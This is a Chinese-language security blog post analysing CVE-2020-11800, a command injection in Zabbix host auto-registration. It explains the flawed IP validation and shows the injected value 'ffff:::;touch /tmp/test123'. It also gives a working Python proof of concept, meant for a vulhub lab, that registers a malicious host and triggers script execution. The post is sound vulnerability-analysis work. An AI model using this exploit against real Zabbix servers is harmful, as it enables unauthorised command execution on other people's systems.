---
layout:     post
title:     Zabbix的命令注入漏洞
subtitle:   CVE-2020-11800
date:       2024-03-22
author:     mengxun
header-img: img/bg/gray-raw.png
catalog: true
tags:
    - 安全
---


#### 0x01 漏洞背景

Zabbix 有一个允许主机自动注册的功能，大致流程是：主机请求 Zabbix 的相应接口，然后把自身注册到其主机列表里。但是当主机注册时，Zabbix 对请求内容里的ip字段，并没有做严格校验，从而导致了 [CVE-2020-11800](https://nvd.nist.gov/vuln/detail/CVE-2020-11800) 以及更早的 [CVE-2017-2824](https://nvd.nist.gov/vuln/detail/CVE-2017-2824) 


#### 0x02 漏洞分析

查看当时为修复漏洞而提交的[源码](https://git.zabbix.com/projects/ZBX/repos/zabbix/commits/ee3941103331c0e3e38174f6daea573a0ea10788#src/libs/zbxcommon/misc.c)，可以看到在修复前，Zabbix 对ip字段的校验不是非常严格，类似于 `ffff:::;touch /tmp/test123` 也可以通过校验，导致这种恶意内容会被写入到主机列表里

![_17648458324747.png](https://s2.loli.net/2025/12/04/PudRBcLbG8Jv47f.png)

而恶意内容写入到主机列表里之后，则可以通过另一种机制（Scripts）去执行恶意内容

![_17648460295804.png](https://s2.loli.net/2025/12/04/H2EUPRVwjyz6Xkc.png)

当执行了比如 `/bin/ping -c 3 {HOST.CONN} 2>&1` 之类的命令时，最终会被拼接成形如 `/bin/ping -c 3 ffff:::;touch /tmp/test123 2>&1` 的命令，从而导致任意命令注入


#### 0x03 问题复现

问题复现的环境可以使用 [vulhub](https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800) 上的容器环境，比较方便。另外，漏洞得到利用有个前提条件，就是在 Zabbix 的界面配置里，配置 `Event source` 为 `Auto registration` 的 action，并且在该 action 下配置了 `Add host` 的操作类型，这个配置的作用是允许主机自动注册到 Zabbix 的主机列表里，没有这个配置则无法将带有恶意内容的字段写到主机列表里。

![_17648442984927.png](https://s2.loli.net/2025/12/04/fnYhiLVu1dWAp5r.png)
![_17648443418529.png](https://s2.loli.net/2025/12/04/sMCk8E9BUcgTfDv.png)

环境部署好了之后，可执行如下poc脚本（需带目标ip参数，如部署在本机，使用 127.0.0.1 即可）

```python
import sys
import socket
import json
import sys


def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data


target = sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/test123"}))
for i in range(10000, 11000):
    data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
    if data and b'failed' not in data:
        print('hostid: %d' % i)
        print(data)
```

如果在脚本的标准输出里看到如下内容，则说明利用成功，可以进入环境内部检查文件是否被创建
```json
{"response":"success","data":"ping: bad address 'ffff:::'\n"}
```

#### 0x04 小结

因为 `/bin/ping -c 3 {HOST.CONN} 2>&1` 之类的命令是默认配在 Zabbix 里的，所以只要在问题版本的 Zabbix 里使用了主机自动注册，则该漏洞的可利用性极高，9.8 的CVE评分也侧面印证了这点。另外此漏洞其实在早前已经修过一次（CVE-2017-2824），但是当时的修复只解决了ipv4场景下的校验，ipv6场景下仍有问题，所以又导致了后续的漏洞。